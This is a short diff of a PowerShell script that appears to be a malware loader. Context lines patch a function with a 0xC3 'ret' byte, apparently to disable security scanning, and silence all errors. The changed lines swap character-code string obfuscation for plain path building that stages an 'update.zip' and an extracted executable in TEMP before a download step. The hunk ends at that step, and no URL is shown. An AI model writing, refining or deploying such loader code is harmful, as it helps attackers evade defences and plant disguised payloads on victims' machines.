@@ -39,19 +39,11 @@ $patch2 = [Byte[]]@(0xC3)
 $ProgressPreference = "SilentlyContinue"
 $ErrorActionPreference = "SilentlyContinue"
 
-# --- Obfuscated strings ---
-$t = [char]116
-$e = [char]101
-$m = [char]109
-$p = [char]112
-$slash = [char]92
-$dot = [char]46
-$zip = [char]122 + [char]105 + [char]112
-
-$basePath = ($env:$t$e$m$p) + $slash
-$zipFile = $basePath + "update" + $dot + $zip
-$extractPath = $basePath + "update" + $slash
-$outFile = $extractPath + $ExeName
+# --- Paths using proper env var ---
+$basePath = Join-Path $env:TEMP ""
+$zipFile = Join-Path $basePath "update.zip"
+$extractPath = Join-Path $basePath "update"
+$outFile = Join-Path $extractPath $ExeName
 
 # --- Download .zip ---
 try {
